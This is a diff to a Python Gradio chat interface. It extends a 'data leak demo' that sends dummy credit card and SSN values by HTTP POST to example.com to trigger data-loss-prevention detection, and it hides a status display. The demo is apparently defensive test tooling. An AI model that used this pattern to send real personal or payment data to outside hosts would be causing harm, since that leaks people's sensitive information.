@@ -861,24 +861,29 @@ class ChatInterface:
                 "Running data leak demo - simulating sensitive data transmission"
             )
 
-            # Use requests library with credit card data similar to the security demo script
+            # Use requests library with both credit card and SSN data
             credit_card_pattern = "3412-1234-1234-2222"
+            ssn_pattern = "123-45-6789"
             import requests
 
-            data = {"creditcard": credit_card_pattern}
+            # Send both types of sensitive data for DLP detection
+            data = {
+                "creditcard": credit_card_pattern,
+                "ssn": ssn_pattern
+            }
             requests.post("http://example.com", data=data, timeout=3)
 
-            # Simple message showing credit card was sent
-            message = f"🔒 Data Leak Demo: Sent credit card {credit_card_pattern}"
+            # Simple popup-style message
+            message = "⚠️ Attempting to send sensitive data"
 
             logger.warning(
-                f"Data leak demo executed - credit card data sent for DLP testing"
+                f"Data leak demo executed - credit card and SSN data sent for DLP testing"
             )
             return gr.Column(visible=False), message, "warning"
 
         except requests.exceptions.Timeout:
             logger.error("Data leak demo timed out")
-            message = f"🔒 Data Leak Demo: Sent credit card {credit_card_pattern}"
+            message = "⚠️ Attempting to send sensitive data"
             return gr.Column(visible=False), message, "warning"
         except Exception as e:
             logger.error(f"Data leak demo failed: {e}")
@@ -1514,12 +1519,8 @@ def create_interface():
 
                     clear_btn = gr.Button("🗑️ Clear All", variant="secondary", size="sm")
 
-                    # Automation status display - always show
-                    with gr.Row():
-                        automation_status = gr.HTML(
-                            value="<div style='text-align: center; color: #ffa726; padding: 10px; background: rgba(255, 167, 38, 0.1); border-radius: 8px; margin: 10px 0;'>⏹️ Automation stopped - Click Start to begin automated testing</div>"
-                        )
-                        # Removed manual refresh button per UI feedback
+                    # Removed automation status display per user request (red box area)
+                    automation_status = gr.HTML(value="", visible=False)
 
         # Configuration Modal (initially hidden)
         with gr.Column(visible=False) as config_panel:
